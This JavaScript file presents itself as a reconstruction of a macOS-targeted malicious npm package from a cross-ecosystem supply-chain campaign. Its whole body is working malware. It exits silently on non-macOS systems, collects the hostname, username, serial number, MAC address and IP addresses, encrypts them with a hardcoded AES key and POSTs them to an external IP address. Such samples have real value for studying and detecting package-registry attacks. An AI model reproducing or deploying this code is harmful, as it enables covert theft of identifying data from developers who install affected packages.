// macos-targeted — reconstructed from public security analyses
// Source: https://blog.phylum.io/malware-campaign-targets-npm-pypi-and-rubygems-developers/
//
// Cross-ecosystem campaign targeting macOS specifically.
// Automatically terminates on non-macOS platforms.
// Coordinates across npm, PyPI, and RubyGems.
//
// Technique: macOS-only targeting + cross-ecosystem coordination + encrypted exfiltration

const os = require("os");
const dns = require("dns");
const https = require("https");
const crypto = require("crypto");
const { execSync } = require("child_process");

// Only target macOS — exit silently on other platforms
if (os.platform() !== "darwin") {
  process.exit(0);
}

// Collect macOS-specific system info
function collectInfo() {
  var info = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    homedir: os.homedir(),
    platform: os.platform(),
    arch: os.arch()
  };

  // Get macOS-specific identifiers
  try {
    info.serialNumber = execSync("system_profiler SPHardwareDataType | grep Serial", { encoding: "utf8" }).trim();
  } catch(e) {}

  try {
    info.macAddress = execSync("ifconfig en0 | grep ether", { encoding: "utf8" }).trim();
  } catch(e) {}

  // Get local network info
  var interfaces = os.networkInterfaces();
  info.ips = [];
  Object.keys(interfaces).forEach(function(name) {
    interfaces[name].forEach(function(iface) {
      if (!iface.internal && iface.family === "IPv4") {
        info.ips.push(iface.address);
      }
    });
  });

  return info;
}

// Encrypt data before exfiltration
function encryptData(data) {
  var key = crypto.createHash("sha256").update("kwxiaodian-key").digest();
  var iv = crypto.randomBytes(16);
  var cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  var encrypted = Buffer.concat([cipher.update(JSON.stringify(data), "utf8"), cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

var info = collectInfo();
var encrypted = encryptData(info);

var payload = JSON.stringify({ data: encrypted });
var req = https.request({
  hostname: "81.70.191.194",
  path: "/collect",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(payload)
  }
});
req.write(payload);
req.end();
